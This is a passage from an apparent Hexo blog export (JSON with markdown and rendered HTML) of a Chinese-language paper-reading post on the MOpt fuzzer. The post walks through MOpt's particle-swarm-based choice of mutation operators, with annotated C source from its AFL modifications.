temp_stage_finds_puppet += stage_finds_puppet[swarm_now][i];\n            \t// 更新一些和计算 生成的好的test case数量 相关的变量\n        }\n\n        swarm_now = swarm_now + 1;\n        if (swarm_now == swarm_num)\n        {\n                key_module = 1;\n                for (i = 0; i < operator_num; i++)\n                {\n                        core_operator_cycles_puppet_v2[i] = core_operator_cycles_puppet[i];\n                        core_operator_cycles_puppet_v3[i] = core_operator_cycles_puppet[i];\n                        core_operator_finds_puppet_v2[i] = core_operator_finds_puppet[i];\n                }\n\t\t\t\t// 更新一些和计算 生成的好的test case数量 相关的变量\n                double swarm_eff = 0.0;\n                swarm_now = 0;\n                for (i = 0; i < swarm_num; i++)\n                {\n                        if (swarm_fitness[i] > swarm_eff)\n                        {\n                                swarm_eff = swarm_fitness[i];\n                                swarm_now = i;\n                        }\n                }\n            \t// 选择最好的swarm\n                if (swarm_now <0 || swarm_now > swarm_num - 1)\n                        PFATAL(\"swarm_now error number  %d\", swarm_now);\n\n        }\n        \n\n}\n\n```\n\n\n\n### 0x2.4.pso_updating()\n\n```c\nvoid pso_updating(void) {\n\n\tg_now += 1;\n\tif (g_now > g_max) g_now = 0;\n\tw_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end; \n\tint tmp_swarm, i, j;\n\tu64 temp_operator_finds_puppet = 0;\n\tfor (i = 0; i < operator_num; i++)\n\t{\n\t\toperator_finds_puppet[i] = core_operator_finds_puppet[i];\n\t\t\n\t\tfor (j = 0; j < swarm_num; j++)\n\t\t{\n\t\t\toperator_finds_puppet[i] = operator_finds_puppet[i] + stage_finds_puppet[j][i];\n\t\t}\n\t\ttemp_operator_finds_puppet = temp_operator_finds_puppet + operator_finds_puppet[i];\n\t}\n\t// 计算变异产生的好test cese的个数\n    // 为更新G_best()做准备\n\tfor (i = 0; i < operator_num; i++)\n\t{\n\t\tif (operator_finds_puppet[i])\n\t\t\tG_best[i] = (double)((double)(operator_finds_puppet[i]) / (double)(temp_operator_finds_puppet)); \n\t}\n    // 更新G_best()，即PSO中的全局最优分布\n\n\tfor (tmp_swarm = 0; tmp_swarm < swarm_num; tmp_swarm++)\n\t{\n\t\tdouble x_temp = 0.0;\n\t\tfor (i = 0; i < operator_num; i++)\n\t\t{\n\t\t\tprobability_now[tmp_swarm][i] = 0.0;\n\t\t\tv_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);\n\t\t\tx_now[tmp_swarm][i] += v_now[tmp_swarm][i];\n\t\t\tif (x_now[tmp_swarm][i] > v_max)\n\t\t\t\tx_now[tmp_swarm][i] = v_max;\n\t\t\telse if (x_now[tmp_swarm][i] < v_min)\n\t\t\t\tx_now[tmp_swarm][i] = v_min;\n\t\t\tx_temp += x_now[tmp_swarm][i];\n\t\t}\n\t\t// 根据pso算法更新v_now数组和x_now数组\n\t\tfor (i = 0; i < operator_num; i++)\n\t\t{\n\t\t\tx_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;\n\t\t\tif (likely(i != 0))\n\t\t\t\tprobability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - 1] + x_now[tmp_swarm][i];\n\t\t\telse\n\t\t\t\tprobability_now[tmp_swarm][i] = x_now[tmp_swarm][i];\n\t\t}\n        // 设置probablility_now为前缀和数组\n        // 供select_algorithm使用\n\t\tif (probability_now[tmp_swarm][operator_num - 1] < 0.99 || probability_now[tmp_swarm][operator_num - 1] > 1.01) FATAL(\"ERROR probability\");\n\t}\n\tswarm_now = 0;\n\tkey_module = 0; \n}\n```\n\n","source":"_posts/PaperReading-Fuzz-MOpt.md","raw":"---\ntitle: PaperReading-Fuzz-MOpt\ndate: 2022-8-17\ntags: \n- Fuzz\n\ncategories:\n- Fuzz\n\ntoc: true # 是否启用内容索引\nsidebar: none # 是否启用sidebar侧边栏，none：不启用\n---\n\n\n\n# MOPT\n\nMOpt是针对传统Mutation based fuzz的变异策略的一种改进Fuzzer，主要通过PSO算法优化了变异操作的选取\n\n## 0x1.核心思路\n\n### 0x1.1.传统Fuzz的变异策略存在的问题\n\n- Different operators’ efficiency varies.\n  不同Mutation operators的效率不同\n- One operator’s efficiency varies with target programs.\n- One operator’s efficiency varies over time.\n- The scheduler incurs performance overhead.\n- Unbalanced data for machine learning.\n\n这些问题，要求我们用更智能化的方法选择各种Mutation operators\n\n### 0x1.2.MOpt\n\n将每个Mutation operators视为PSO中的一个particle，寻找其最佳概率\n\n\n\n#### 0x1.2.1.一些参数\n\n- L~best~ : particle在概率空间中的最佳(对应的优秀测试用例更多)分布\n- G~best~ : 区别于传统粒子群算法，在计算时，实际上所有particle分布在不同的概率空间，不可能存在一个传统意义上的适应于所有particle的G~best~，那么同样从全局意义考虑，将所有particle对应的interesting test cases数量之和，作为整个swarm的globel~eff~，而每个partcle在globel~eff~ 中的比例，作为其对应的G~best~\n\n#### 0x1.2.2.overview\n\n在每一次fuzz过程中额外的三个task:\n\n- 更新每个particle的L~best~ 为效率最高的eff~best~\n- 更新每个particle的G~best~\n- 选择最好的swarm指导fuzzing(避免陷入局部最优点)  // 一个疑问\n\n同时，在每次迭代最后，还要按照PSO算法，更行每个particle的position\n\n```tex\nvnow[Si][Pj] ←w × vnow[Si][Pj] \n    \t\t+r × (Lbest [Si][Pj] − xnow[Si][Pj]) \n    \t\t+r × (Gbest [Pj] − xnow[Si][Pj]). (3) \n    \nxnow[Si][Pj] ← xnow[Si][Pj] + vnow[Si][Pj]. (4)\n```\n\n#### 0x1.2.3.Main Framework\n\n**PSO Initialization Module:**\n\n负责PSO相关参数的初始化:\n\n- 设置每个swarm中的每个particle的*X~now~* 为随机值，并保证每个群中的X~now~之和为1\n- 把每个particle的*V~now~*设置为0.1\n- 设置每个particle的*eff~now~*为0\n- 设置每个particle的*G~best~*和*L~best~*为0.5\n\n**Pilot Fuzzing Module**\n\n对多个swarm找最优概率分布\n\n**Core Fuzzing Module**\n\n针对一个swarm找最优概率分布\n\n**PSO Updating Module**\n\n根据PSO算法迭代*V~now~*和*X~now~*\n\n**Pacemaker Fuzzing Mode**\n\n主要是针对Mutation based fuzz的deterministic stage，对于特定的条件，酌情跳过，deterministic stage，以提高效率。\n\n对于上述模块的具体分析放在源代码分析中。\n\n## 0x2.源代码分析\n\n主要分析相对于AFL算法所作的改进， 以源代码中的中文注释为主要形式\n\n\n\n差异部分:\n\n原调用链：\n\nmain->fuzz_one\n\n现调用链:\n\nmain->fuzz_one->normal_fuzz / pivot_fuzz / core_fuzz / pso_update\n\n主要更改了afl-fuzz.c->fuzz_one->havoc环节的逻辑\n\n\n\n整体思路(红线部分为我自己添加的MOpt思路，原图来自MOpt原论文，表明AFL的mutatition stage):\n\n![MOpt](./MOpt.png)\n\n### 0x2.1.main()\n\n关注主要逻辑，根据需要，选择性的忽视了一些无关主要逻辑的代码\n\n**新增参数判断**\n\n-L 参数负责控制转入Pacemaker Fuzzing Mode的时间。\n\n```c\n\n        case 'L': { /* MOpt mode */\n\t\t// L 参数负责控制转入Pacemaker Fuzzing Mode的时间\n        // -L 30 相当于24小时左右\n        // ref: https://github.com/puppet-meteor/MOpt-AFL\n            //if (limit_time_sig)  FATAL(\"Multiple -L options not supported\");\n            limit_time_sig = 1;\n\t\t\t// \n\t\t\tif (sscanf(optarg, \"%llu\", &limit_time_puppet) < 1 ||\n\t\t\t\toptarg[0] == '-') FATAL(\"Bad syntax used for -L\");\n\n\t\t\tu64 limit_time_puppet2 = limit_time_puppet * 60 * 1000;\n\n\t\t\tif (limit_time_puppet2 < limit_time_puppet ) FATAL(\"limit_time overflow\");\n\t\t\t\tlimit_time_puppet = limit_time_puppet2;\n\n\t\t\tSAYF(\"limit_time_puppet %llu\\n\",limit_time_puppet);\n\n\t\t\tif (limit_time_puppet == 0 )\n\t\t\t    key_puppet = 1;\n\n\n        }\n        break;\n```\n\n**针对MOpt的全局变量的初始化**\n\n对应于前文的**PSO Initialization Module** 具体内容可以查看前文\n\n```c\n  {                //initialize swarms\n        int i;\n        int tmp_swarm = 0;\n        swarm_now = 0;\n\n        if (g_now > g_max) g_now = 0;\n                w_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end;\n\n        for (tmp_swarm = 0; tmp_swarm < swarm_num; tmp_swarm++)\n        {\n                double total_puppet_temp = 0.0;\n                swarm_fitness[tmp_swarm] = 0.0;\n\n                for (i = 0; i < operator_num; i++)\n                {\n                        stage_finds_puppet[tmp_swarm][i] = 0;\n                        probability_now[tmp_swarm][i] = 0.0;\n                        x_now[tmp_swarm][i] = ((double)(random() % 7000)*0.0001 + 0.1);\n                        total_puppet_temp += x_now[tmp_swarm][i];\n                        v_now[tmp_swarm][i] = 0.1;\n                        L_best[tmp_swarm][i] = 0.5;\n                        G_best[i] = 0.5;\n                        eff_best[tmp_swarm][i] = 0.0;\n\n                }\n\n\n                for (i = 0; i < operator_num; i++) {\n                        stage_cycles_puppet_v2[tmp_swarm][i] = stage_cycles_puppet[tmp_swarm][i];\n                        stage_finds_puppet_v2[tmp_swarm][i] = stage_finds_puppet[tmp_swarm][i];\n                        x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / total_puppet_temp;\n                }\n\n                double x_temp = 0.0;\n\n                for (i = 0; i < operator_num; i++)\n                {\n                        probability_now[tmp_swarm][i] = 0.0;\n                        v_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);\n\n                        x_now[tmp_swarm][i] += v_now[tmp_swarm][i];\n\n                        if (x_now[tmp_swarm][i] > v_max)\n                                x_now[tmp_swarm][i] = v_max;\n                        else if (x_now[tmp_swarm][i] < v_min)\n                                x_now[tmp_swarm][i] = v_min;\n\n                        x_temp += x_now[tmp_swarm][i];\n                }\n\n                for (i = 0; i < operator_num; i++)\n                {\n                        x_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;\n                        if (likely(i != 0))\n                                probability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - 1] + x_now[tmp_swarm][i];\n                        else\n                                probability_now[tmp_swarm][i] = x_now[tmp_swarm][i];\n                }\n                if (probability_now[tmp_swarm][operator_num - 1] < 0.99 || probability_now[tmp_swarm][operator_num - 1] > 1.01)\n                    FATAL(\"ERROR probability\");\n        }\n\n        for (i = 0; i < operator_num; i++)\n        {\n                core_operator_finds_puppet[i] = 0;\n                core_operator_finds_puppet_v2[i] = 0;\n                core_operator_cycles_puppet[i] = 0;\n                core_operator_cycles_puppet_v2[i] = 0;\n                core_operator_cycles_puppet_v3[i] = 0;\n        }\n  }\n```\n\n### 0x2.2.select_algorithm()\n\n根据PSO获得的概率分布，选择不同的变异算法\n\n```c\nint select_algorithm(int extras) {\n\n  int i_puppet, j_puppet;\n  //double total_puppet = 0.0;\n//srandom(time(NULL));\n\n    u32 seed[2];\n\n    ck_read(dev_urandom_fd, &seed, sizeof(seed), \"/dev/urandom\");\n\n    srandom(seed[0]);\n\n  //double sele = ((double)(random()%10000)*0.0001);\n  //SAYF(\"select : %f\\n\",sele);\n  j_puppet = 0;\n  int operator_number = operator_num;\n  if (extras < 2) operator_number = operator_number - 2;\n  double range_sele = (double)probability_now[swarm_now][operator_number - 1];\n  double sele = ((double)(random() % 10000) * 0.0001 * range_sele);\n    \n// 这里的probability_now由pso_uadating()确定\n// probability_now是一个概率的前缀和数组，\n// 最后一位也就是probability_now[swarm_now][operator_number - 1]应该为1\n    \n  for (i_puppet = 0; i_puppet < operator_number; i_puppet++)\n  {\n      if (unlikely(i_puppet == 0))\n      {\n          if (sele < probability_now[swarm_now][i_puppet])\n            break;\n      }\n      else\n      {\n          if (sele < probability_now[swarm_now][i_puppet])\n          {\n              j_puppet =1;\n              break;\n          }\n      }\n  }\n    \n  // 由上面对于sele的分析，可以知道这里是按照对应的概率设置i_puppet\n  // i_puppet对应选择到的操作\n    \n  if ((j_puppet ==1 && sele < probability_now[swarm_now][i_puppet-1]) || (i_puppet + 1 < operator_num && sele > probability_now[swarm_now][i_puppet +  1]))\n    FATAL(\"error select_algorithm\");\n  return i_puppet;\n}\n```\n\n### 0x2.2.fuzz_one()\n\nfuzz_one() 是完成Mutation operators的核心流程，在main()中每一次fuzz循环中被调用\n\n```c\nstatic u8 fuzz_one(char** argv) {\n\tint key_val_lv = 0;\n\tif (limit_time_sig == 0)\n\t\tkey_val_lv = normal_fuzz_one(argv);\n    \t// normal_fuzz_one() 是原来AFL的fuzz_one()\n\telse\n\t{\n\t\tif (key_module == 0)\n\t\t\tkey_val_lv = pilot_fuzzing(argv);\n        \t// 对应0x1.2.3.Main Framework 中的pilot fuzzing module\n\t\telse if (key_module == 1)\n\t\t\tkey_val_lv = core_fuzzing(argv);\n        \t// 对应core fuzzing module\n\t\telse if (key_module == 2)\n\t\t\tpso_updating();\n        \t// 对应PSO updating module\n\t}\n\n\treturn key_val_lv;\t\n}\n```\n\n### 0x2.3.pilot_fuzzing()\n\n这是整个MOpt的核心模块，他是在原AFL的基础上修改得到的，所以主要分析和原AFL的差异部分。\n\ncore_pilot与此类似，所以不做单独分析\n\n#### 0x2.3.1.Pacemaker Fuzzing Mode\n\n由于deterministic stage的小型改动在前期比较有用，在后期长时间处于deterministic stage会导致效率下降，所以在原fuzz_one() 直接跳到havoc_stage() 的逻辑后面，增加一个时间判断，判断是否要直接跳到havoc_stage()\n\n```c\n// line 6999 in afl_fuzz.c\n\ncur_ms_lv = get_cur_time();\n// 获取当前时间\nif (!(key_puppet == 0 && ((cur_ms_lv - last_path_time < limit_time_puppet) \n        (last_crash_time != 0 && cur_ms_lv - last_crash_time < limit_time_puppet) || last_path_time == 0)))\n// 如果距离上一次crash或者找到新路径的时间，超过了通过-L参数设置的limit_time_puppet\n// 说明长时间陷入了deterministic stage\n// 直接跳过deterministic stage进入havoc_stage()\n{\n        key_puppet = 1;\n        goto pacemaker_fuzzing;\n}\n```\n\n\n\n#### 0x2.3.2.Mutation operators select\n\n在havoc阶段，要进行变异策略的选择，相比于原来的随机选择，MOpt根据PSO得到的概率分布进行策略的选择\n\n```c\n// line 8165 in afl-fuzz.c\n\nswitch (select_algorithm( extras_cnt + a_extras_cnt )) \n```\n\n#### 0x2.3.3.Before return\n\n返回前新增的一些变化\n\n```c\nif (key_puppet == 1)\n//一个小型的flag\n//在前面pacemaker的跳转时被设置为1\n{\n        if (unlikely(queued_paths + unique_crashes > ((queued_paths + unique_crashes)*limit_time_bound + orig_hit_cnt_puppet)))\n        {\n                key_puppet = 0;\n                cur_ms_lv = get_cur_time();\n                new_hit_cnt = queued_paths + unique_crashes;\n                orig_hit_cnt_puppet = 0;\n                last_limit_time_start = 0;\n        }\n}\n// 还原并更新一些变量\n\nif (unlikely(tmp_pilot_time > period_pilot))\n{\n        total_pacemaker_time += tmp_pilot_time;\n        new_hit_cnt = queued_paths + unique_crashes;\n        swarm_fitness[swarm_now] = (double)(total_puppet_find - temp_puppet_find) / ((double)(tmp_pilot_time)/ period_pilot_tmp);\n        tmp_pilot_time = 0;\n        temp_puppet_find = total_puppet_find;\n\n        u64 temp_stage_finds_puppet = 0;\n        for (i = 0; i < operator_num; i++)\n        {\n                double temp_eff = 0.0;\n\n                if (stage_cycles_puppet_v2[swarm_now][i] > stage_cycles_puppet[swarm_now][i])\n                        temp_eff = (double)(stage_finds_puppet_v2[swarm_now][i] - stage_finds_puppet[swarm_now][i]) /\n                        (double)(stage_cycles_puppet_v2[swarm_now][i] - stage_cycles_puppet[swarm_now][i]);\n                if (eff_best[swarm_now][i] < temp_eff)\n                {\n                        eff_best[swarm_now][i] = temp_eff;\n                        L_best[swarm_now][i] = x_now[swarm_now][i];\n                }\n            \t// 找到particle对应的历史最优概率分布\n\t\t\t\t// 更新L_best\n                stage_finds_puppet[swarm_now][i] = stage_finds_puppet_v2[swarm_now][i];\n                stage_cycles_puppet[swarm_now][i] = stage_cycles_puppet_v2[swarm_now][i];\n                temp_stage_finds_puppet += stage_finds_puppet[swarm_now][i];\n            \t// 更新一些和计算 生成的好的test case数量 相关的变量\n        }\n\n        swarm_now = swarm_now + 1;\n        if (swarm_now == swarm_num)\n        {\n                key_module = 1;\n                for (i = 0; i < operator_num; i++)\n                {\n                        core_operator_cycles_puppet_v2[i] = core_operator_cycles_puppet[i];\n                        core_operator_cycles_puppet_v3[i] = core_operator_cycles_puppet[i];\n                        core_operator_finds_puppet_v2[i] = core_operator_finds_puppet[i];\n                }\n\t\t\t\t// 更新一些和计算 生成的好的test case数量 相关的变量\n                double swarm_eff = 0.0;\n                swarm_now = 0;\n                for (i = 0; i < swarm_num; i++)\n                {\n                        if (swarm_fitness[i] > swarm_eff)\n                        {\n                                swarm_eff = swarm_fitness[i];\n                                swarm_now = i;\n                        }\n                }\n            \t// 选择最好的swarm\n                if (swarm_now <0 || swarm_now > swarm_num - 1)\n                        PFATAL(\"swarm_now error number  %d\", swarm_now);\n\n        }\n        \n\n}\n\n```\n\n\n\n### 0x2.4.pso_updating()\n\n```c\nvoid pso_updating(void) {\n\n\tg_now += 1;\n\tif (g_now > g_max) g_now = 0;\n\tw_now = (w_init - w_end)*(g_max - g_now) / (g_max)+w_end; \n\tint tmp_swarm, i, j;\n\tu64 temp_operator_finds_puppet = 0;\n\tfor (i = 0; i < operator_num; i++)\n\t{\n\t\toperator_finds_puppet[i] = core_operator_finds_puppet[i];\n\t\t\n\t\tfor (j = 0; j < swarm_num; j++)\n\t\t{\n\t\t\toperator_finds_puppet[i] = operator_finds_puppet[i] + stage_finds_puppet[j][i];\n\t\t}\n\t\ttemp_operator_finds_puppet = temp_operator_finds_puppet + operator_finds_puppet[i];\n\t}\n\t// 计算变异产生的好test cese的个数\n    // 为更新G_best()做准备\n\tfor (i = 0; i < operator_num; i++)\n\t{\n\t\tif (operator_finds_puppet[i])\n\t\t\tG_best[i] = (double)((double)(operator_finds_puppet[i]) / (double)(temp_operator_finds_puppet)); \n\t}\n    // 更新G_best()，即PSO中的全局最优分布\n\n\tfor (tmp_swarm = 0; tmp_swarm < swarm_num; tmp_swarm++)\n\t{\n\t\tdouble x_temp = 0.0;\n\t\tfor (i = 0; i < operator_num; i++)\n\t\t{\n\t\t\tprobability_now[tmp_swarm][i] = 0.0;\n\t\t\tv_now[tmp_swarm][i] = w_now * v_now[tmp_swarm][i] + RAND_C * (L_best[tmp_swarm][i] - x_now[tmp_swarm][i]) + RAND_C * (G_best[i] - x_now[tmp_swarm][i]);\n\t\t\tx_now[tmp_swarm][i] += v_now[tmp_swarm][i];\n\t\t\tif (x_now[tmp_swarm][i] > v_max)\n\t\t\t\tx_now[tmp_swarm][i] = v_max;\n\t\t\telse if (x_now[tmp_swarm][i] < v_min)\n\t\t\t\tx_now[tmp_swarm][i] = v_min;\n\t\t\tx_temp += x_now[tmp_swarm][i];\n\t\t}\n\t\t// 根据pso算法更新v_now数组和x_now数组\n\t\tfor (i = 0; i < operator_num; i++)\n\t\t{\n\t\t\tx_now[tmp_swarm][i] = x_now[tmp_swarm][i] / x_temp;\n\t\t\tif (likely(i != 0))\n\t\t\t\tprobability_now[tmp_swarm][i] = probability_now[tmp_swarm][i - 1] + x_now[tmp_swarm][i];\n\t\t\telse\n\t\t\t\tprobability_now[tmp_swarm][i] = x_now[tmp_swarm][i];\n\t\t}\n        // 设置probablility_now为前缀和数组\n        // 供select_algorithm使用\n\t\tif (probability_now[tmp_swarm][operator_num - 1] < 0.99 || probability_now[tmp_swarm][operator_num - 1] > 1.01) FATAL(\"ERROR probability\");\n\t}\n\tswarm_now = 0;\n\tkey_module = 0; \n}\n```\n\n","slug":"PaperReading-Fuzz-MOpt","published":1,"updated":"2022-08-17T12:26:57.284Z","_id":"cl6xkro2s0000h0v0cg8oh918","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"MOPT\">MOPT</h1>\n<p>MOpt是针对传统Mutation based fuzz的变异策略的一种改进Fuzzer，主要通过PSO算法优化了变异操作的选取</p>\n<h2 id=\"0x1-核心思路\">0x1.核心思路</h2>\n<h3 id=\"0x1-1-传统Fuzz的变异策略存在的问题\">0x1.1.传统Fuzz的变异策略存在的问题</h3>\n<ul>\n<li>Different operators’ efficiency varies.<br>\n不同Mutation operators的效率不同</li>\n<li>One operator’s efficiency varies with target programs.</li>\n<li>One operator’s efficiency varies over time.</li>\n<li>The scheduler incurs performance overhead.</li>\n<li>Unbalanced data for machine learning.</li>\n</ul>\n<p>这些问题，要求我们用更智能化的方法选择各种Mutation operators</p>\n<h3 id=\"0x1-2-MOpt\">0x1.2.MOpt</h3>\n<p>将每个Mutation operators视为PSO中的一个particle，寻找其最佳概率</p>\n<h4 id=\"0x1-2-1-一些参数\">0x1.2.1.一些参数</h4>\n<ul>\n<li>L~best~ : particle在概率空间中的最佳(对应的优秀测试用例更多)分布</li>\n<li>G~best~ : 区别于传统粒子群算法，在计算时，实际上所有particle分布在不同的概率空间，不可能存在一个传统意义上的适应于所有particle的G~best~，那么同样从全局意义考虑，将所有particle对应的interesting test cases数量之和，作为整个swarm的globel~eff~，而每个partcle在globel~eff~ 中的比例，作为其对应的G~best~</li>\n</ul>\n<h4 id=\"0x1-2-2-overview\">0x1.2.2.overview</h4>\n<p>在每一次fuzz过程中额外的三个task:</p>\n<ul>\n<li>更新每个particle的L~best~ 为效率最高的eff~best~</li>\n<li>更新每个particle的G~best~</li>\n<li>选择最好的swarm指导fuzzing(避免陷入局部最优点)  // 一个疑问</li>\n</ul>\n<p>同时，在每次迭代最后，还要按照PSO算法，更行每个particle的position</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vnow[Si][Pj] ←w × vnow[Si][Pj] </span><br><span class=\"line\">    \t\t+r × (Lbest [Si][Pj] − xnow[Si][Pj]) </span><br><span class=\"line\">    \t\t+r × (Gbest [Pj] − xnow[Si][Pj]). (3) </span><br><span class=\"line\">    </span><br><span class=\"line\">xnow[Si][Pj] ← xnow[Si][Pj] + vnow[Si][Pj]. (4)</span><br></pre></td></tr></table></figure>\n<h4 id=\"0x1-2-3-Main-Framework\">0x1.2.3.Main Framework</h4>\n<p><strong>PSO Initialization Module:</strong></p>\n<p>负责PSO相关参数的初始化:</p>\n<ul>\n<li>设置每个swarm中的每个particle的<em>X~now~</em> 为随机值，并保证每个群中的X~now~之和为1</li>\n<li>把每个particle的*V~now~*设置为0.1</li>\n<li>设置每个particle的*eff~now~*为0</li>\n<li>设置每个particle的*G~best~<em>和</em>L~best~*为0.5</li>\n</ul>\n<p><strong>Pilot Fuzzing Module</strong></p>\n<p>对多个swarm找最优概率分布</p>\n<p><strong>Core Fuzzing Module</strong></p>\n<p>针对一个swarm找最优概率分布</p>\n<p><strong>PSO Updating Module</strong></p>\n<p>根据PSO算法迭代<em>V~now~<em>和</em>X~now~</em></p>\n<p><strong>Pacemaker Fuzzing Mode</strong></p>\n<p>主要是针对Mutation based fuzz的deterministic stage，对于特定的条件，酌情跳过，deterministic stage，以提高效率。</p>\n<p>对于上述模块的具体分析放在源代码分析中。</p>\n<h2 id=\"0x2-源代码分析\">0x2.源代码分析</h2>\n<p>主要分析相对于AFL算法所作的改进， 以源代码中的中文注释为主要形式</p>\n<p>差异部分:</p>\n<p>原调用链：</p>\n<p>main-&gt;fuzz_one</p>\n<p>现调用链:</p>\n<p>main-&gt;fuzz_one-&gt;normal_fuzz / pivot_fuzz / core_fuzz / pso_update</p>\n<p>主要更改了afl-fuzz.c-&gt;fuzz_one-&gt;havoc环节的逻辑</p>\n<p>整体思路(红线部分为我自己添加的MOpt思路，原图来自MOpt原论文，表明AFL的mutatition stage):</p>\n<p><img src=\"./MOpt.png\" alt=\"MOpt\"></p>\n<h3 id=\"0x2-1-main\">0x2.1.main()</h3>\n<p>关注主要逻辑，根据需要，选择性的忽视了一些无关主要逻辑的代码</p>\n<p><strong>新增参数判断</strong></p>\n<p>-L 参数负责控制转入Pacemaker Fuzzing Mode的时间。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">case</span> <span class=\"string\">&#x27;L&#x27;</span>: &#123; <span class=\"comment\">/* MOpt mode */</span></span><br><span class=\"line\"><span class=\"comment\">// L 参数负责控制转入Pacemaker Fuzzing Mode的时间</span></span><br><span class=\"line\">      <span class=\"comment\">// -L 30 相当于24小时左右</span></span><br><span class=\"line\">      <span class=\"comment\">// ref: https://github.com/puppet-meteor/MOpt-AFL</span></span><br><span class=\"line\">          <span class=\"comment\">//if (limit_time_sig)  FATAL(&quot;Multiple -L options not supported&quot;);</span></span><br><span class=\"line\">          limit_time_sig = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// </span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"built_in\">sscanf</span>(optarg, <span class=\"string\">&quot;%llu&quot;</span>, &amp;limit_time_puppet) &lt; <span class=\"number\">1</span> ||</span><br><span class=\"line\">\t\toptarg[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;-&#x27;</span>) FATAL(<span class=\"string\">&quot;Bad syntax used for -L&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tu64 limit_time_puppet2 = limit_time_puppet * <span class=\"number\">60</span> * <span class=\"number\">1000</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (limit_time_puppet2 &lt; limit_time_puppet ) FATAL(<span class=\"string\">&quot;limit_time overflow&quot;</span>);</span><br><span class=\"line\">\t\tlimit_time_puppet = limit_time_puppet2;</span><br><span class=\"line\"></span><br><span class=\"line\">\tSAYF(<span class=\"string\">&quot;limit_time_puppet %llu\\n&quot;</span>,limit_time_puppet);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (limit_time_puppet == <span class=\"number\">0</span> )</span><br><span class=\"line\">\t    key_puppet = <span class=\"number\">1</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>针对MOpt的全局变量的初始化</strong></p>\n<p>对应于前文的<strong>PSO Initialization Module</strong> 具体内容可以查看前文</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;                <span class=\"comment\">//initialize swarms</span></span><br><span class=\"line\">      <span class=\"type\">int</span> i;</span><br><span class=\"line\">      <span class=\"type\">int</span> tmp_swarm = <span class=\"number\">0</span>;</span><br><span class=\"line\">      swarm_now = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (g_now &gt; g_max) g_now = <span 